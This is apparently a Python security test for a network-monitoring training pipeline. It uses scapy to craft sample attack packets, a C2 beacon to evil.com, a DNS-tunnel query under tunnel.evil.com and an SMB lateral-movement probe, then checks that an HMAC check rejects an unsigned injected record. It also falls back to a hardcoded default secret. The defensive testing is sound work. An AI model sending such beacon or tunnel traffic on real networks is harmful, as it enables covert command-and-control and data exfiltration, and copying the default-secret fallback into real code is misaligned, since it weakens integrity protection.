"""
Adversarial Data Injection Test Case
STRIDE Threat: T07 — Training Pipeline Tampering
"""

from scapy.all import IP, TCP, DNS, DNSQR, UDP, Raw, wrpcap
import random
import json
import hashlib
import hmac as hmac_lib
import os
from loguru import logger


def craft_c2_beacon_packet(src_ip, dst_ip, dst_port=8888):
    packet = (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=random.randint(40000, 60000), dport=dst_port, flags="PA") /
        Raw(load=b"GET /beacon HTTP/1.1\r\nHost: evil.com\r\n\r\n")
    )
    return packet


def craft_dns_tunnel_packet(src_ip, dns_server="8.8.8.8"):
    encoded_payload = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q"
    query = f"{encoded_payload}.tunnel.evil.com"
    packet = (
        IP(src=src_ip, dst=dns_server) /
        UDP(sport=random.randint(40000, 60000), dport=53) /
        DNS(rd=1, qd=DNSQR(qname=query, qtype="TXT"))
    )
    return packet


def craft_lateral_movement_packet(src_ip, dst_ip):
    packet = (
        IP(src=src_ip, dst=dst_ip) /
        TCP(sport=random.randint(40000, 60000), dport=445, flags="S")
    )
    return packet


def run_injection_test():
    logger.info("=" * 60)
    logger.info("ADVERSARIAL INJECTION TEST — STRIDE T07")
    logger.info("=" * 60)

    logger.info("Step 1: Crafting adversarial packets...")
    beacon_pkt = craft_c2_beacon_packet("192.168.1.100", "203.0.113.1")
    dns_pkt = craft_dns_tunnel_packet("192.168.1.100")
    lateral_pkt = craft_lateral_movement_packet("192.168.1.100", "192.168.1.200")

    pcap_path = "/tmp/adversarial_injection_test.pcap"
    wrpcap(pcap_path, [beacon_pkt, dns_pkt, lateral_pkt])
    logger.info(f"  Packets written to {pcap_path}")

    logger.info("Step 2: Simulating unsigned Kafka message injection...")
    fake_record = {
        "id.orig_h": "192.168.1.100",
        "id.resp_h": "203.0.113.1",
        "id.orig_p": 54321,
        "id.resp_p": 8888,
        "proto": "tcp",
        "duration": 60.0,
        "orig_bytes": 900,
        "resp_bytes": 124,
        "_source": "INJECTED_BY_ATTACKER",
        "_integrity_hmac": None
    }

    logger.info("Step 3: Testing HMAC integrity check...")
    hmac_secret = os.getenv("KAFKA_HMAC_SECRET", "default-secret-change-in-prod")
    stored_hmac = fake_record.pop("_integrity_hmac")
    payload = json.dumps(fake_record, sort_keys=True).encode()
    expected_hmac = hmac_lib.new(hmac_secret.encode(), payload, hashlib.sha256).hexdigest()

    integrity_check_passed = stored_hmac is not None and hmac_lib.compare_digest(
        stored_hmac, expected_hmac
    )

    result = {
        "test_name": "Adversarial Data Injection Test — STRIDE T07",
        "packets_crafted": 3,
        "packet_types": ["c2_beacon", "dns_tunnel", "lateral_movement"],
        "pcap_path": pcap_path,
        "unsigned_injection_attempted": True,
        "hmac_check_blocked_injection": not integrity_check_passed,
        "verdict": (
            "PASS: HMAC check correctly rejected unsigned injected record"
            if not integrity_check_passed
            else "FAIL: Unsigned record accepted — HMAC check not working"
        ),
        "stride_threat": "T07 — Training Pipeline Tampering",
        "mitigation_status": "EFFECTIVE" if not integrity_check_passed else "NOT EFFECTIVE"
    }

    logger.info(f"Test Result: {result['verdict']}")
    logger.info(f"STRIDE T07 Mitigation: {result['mitigation_status']}")
    return result


if __name__ == "__main__":
    result = run_injection_test()
    print(json.dumps(result, indent=2))
